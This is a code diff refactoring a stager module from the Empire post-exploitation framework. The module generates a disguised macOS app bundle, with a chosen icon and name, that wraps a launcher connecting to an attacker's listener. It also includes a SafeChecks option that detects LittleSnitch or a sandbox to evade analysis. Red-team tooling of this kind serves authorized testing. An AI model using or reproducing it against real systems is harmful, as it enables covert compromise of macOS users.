@@ -1,7 +1,5 @@
 import logging
 
-from empire.server.utils.string_util import removeprefix, removesuffix
-
 log = logging.getLogger(__name__)
 
 
@@ -20,10 +18,7 @@ class Stager:
             "Comments": [""],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -52,7 +47,7 @@ class Stager:
                 "Value": "out.zip",
             },
             "SafeChecks": {
-                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
+                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                 "Required": True,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
@@ -72,12 +67,9 @@ class Stager:
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         user_agent = self.options["UserAgent"]["Value"]
@@ -86,12 +78,11 @@ class Stager:
         icns_path = self.options["AppIcon"]["Value"]
         app_name = self.options["AppName"]["Value"]
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
+        launcher = self.mainMenu.stagergenv2.generate_launcher(
             listener_name,
             language=language,
-            userAgent=user_agent,
-            safeChecks=safe_checks,
+            user_agent=user_agent,
+            safe_checks=safe_checks,
         )
 
         if launcher == "":
@@ -99,13 +90,13 @@ class Stager:
             return ""
 
         disarm = False
-        launcher = removeprefix(launcher, "echo ")
-        launcher = removesuffix(launcher, " | python3 &")
+        launcher = launcher.removeprefix("echo ")
+        launcher = launcher.removesuffix(" | python3 &")
         launcher = launcher.strip('"')
-        return self.mainMenu.stagers.generate_appbundle(
-            launcherCode=launcher,
-            Arch=arch,
+        return self.mainMenu.stagergenv2.generate_appbundle(
+            launcher_code=launcher,
+            arch=arch,
             icon=icns_path,
-            AppName=app_name,
+            app_name=app_name,
             disarm=disarm,
         )
